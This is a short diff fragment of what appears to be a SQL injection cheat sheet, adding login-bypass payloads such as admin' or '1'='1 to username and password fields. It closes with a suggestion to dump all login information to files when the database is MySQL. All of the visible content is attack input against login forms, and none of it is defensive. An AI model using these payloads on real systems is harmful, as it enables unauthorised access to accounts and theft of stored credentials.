@@ -12,7 +12,9 @@
   PASSWORD:   */ =1 --  
 
   USERNAME: admin' or 'a'='a  
-  PASSWORD '#  
+  PASSWORD: '#  
+  USERNAME: admin' or '1'='1
+  PASSWORD: admin' or '1'='1
 
 If the database is mysql, try to dump all login info to files?
 
